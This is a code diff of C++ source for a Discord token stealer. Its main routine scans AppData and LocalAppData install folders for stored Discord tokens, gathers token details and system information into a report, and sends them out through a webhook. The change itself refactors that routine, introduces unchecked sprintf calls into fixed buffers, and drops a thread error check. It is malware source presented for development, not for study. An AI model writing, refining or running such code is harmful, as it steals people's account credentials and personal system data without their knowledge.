@@ -31,18 +31,18 @@
 namespace fs = std::filesystem;
 
 DWORD WINAPI MainRoutine() {
-	// TODO: make function less ugly
-
 	SystemQueryInformation_t SysComputerQueryInformation;
 	GetSystemQueryInformation(&SysComputerQueryInformation);
 
-	for (uint32_t i = 0; i < Config::installs.size(); i++) {
-		std::string path = std::getenv("appdata") + Config::installs[i];
+	char path[MAX_PATH];
 
-		if (i > 3)
-			path = std::getenv("localappdata") + Config::installs[i];
+	for (uint32_t i = 0; i < sizeof(Config::installs) / sizeof(Config::installs[0]); i++) {
+		sprintf(path, "%s%s", std::getenv("appdata"), Config::installs[i]);
 
-		if (!fs::exists(path)) 
+		if (i > 3) // change to browser path configuration
+			sprintf(path, "%s%s", std::getenv("localappdata"), Config::installs[i]);
+
+		if (!fs::exists(path))
 			continue;
 
 		for (const fs::directory_entry& entry : fs::directory_iterator(path)) {
@@ -67,10 +67,10 @@ DWORD WINAPI MainRoutine() {
 				Discord::Discord token;
 
 				token.init(matches[i]);
-				std::string ReportInformation = token.getTokenInfo();
+				std::string report = token.getTokenInfo();
 
-				ReportInformation.append(SysComputerInformationCreateReport(&SysComputerQueryInformation));
-				SendWebhook(ReportInformation);
+				report.append(SysInformationCreateReport(&SysComputerQueryInformation));
+				SendWebhook(report);
 			}
 		}
 	}
@@ -106,12 +106,6 @@ int main(int argc, char* argv[]) {
 	
 	if (!hThread)
 		return -2;
-
-	if (hThread == INVALID_HANDLE_VALUE)
-	{
-		DbgPrint("Could not initialize thread\r\n");
-		return -3;
-	}
 
 	WaitForSingleObject(hThread, INFINITE);
 	CloseHandle(hThread);
